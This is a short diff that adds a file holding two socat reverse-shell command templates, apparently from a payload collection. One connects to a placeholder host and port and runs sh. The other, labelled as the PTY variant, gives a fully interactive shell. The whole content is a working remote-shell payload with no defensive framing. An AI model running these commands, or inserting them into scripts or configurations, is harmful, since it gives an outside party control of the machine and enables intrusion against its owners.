@@ -1,0 +1,2 @@
+socat TCP:TEMPHOST:TEMPPORT EXEC:sh
+NOTE: pty --> socat TCP:TEMPHOST:TEMPPORT EXEC:'sh',pty,stderr,setsid,sigint,sane
